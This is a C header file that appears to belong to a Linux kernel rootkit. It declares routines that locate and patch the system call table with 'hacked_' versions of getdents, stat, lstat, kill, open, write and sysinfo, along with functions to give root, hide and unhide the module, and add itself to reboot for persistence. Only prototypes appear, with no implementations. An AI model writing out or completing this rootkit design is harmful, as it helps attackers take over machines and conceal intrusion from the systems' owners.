#ifndef MODIFY_SYSCALLS_H_INCLUDED
#define MODIFY_SYSCALLS_H_INCLUDED

// we need to define this struct ourselves for
// getdents (odd...)
struct linux_dirent {
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                            offsetof(struct linux_dirent, d_name) */
};

void update_sys_calls(void **sys_call_table);

void revert_to_original(void **sys_call_table);

asmlinkage int hacked_sysinfo(struct sysinfo *info);

asmlinkage int hacked_kill(pid_t pid, int sig);

asmlinkage int hacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count);

asmlinkage int hacked_stat(const char *path, struct stat *buf);

asmlinkage int hacked_lstat(const char *path, struct stat *buf);

asmlinkage int hacked_open(const char __user *pathname, int flags, mode_t mode);

asmlinkage int hacked_write(unsigned int fd, const char *buf, size_t count);

void give_root(void);

void hide(void);
void unhide(void);

void **find_syscall_table(void);

void add_to_reboot(void);
void add_to_reboot_exit(void);

int max_m(int a, int b);

#endif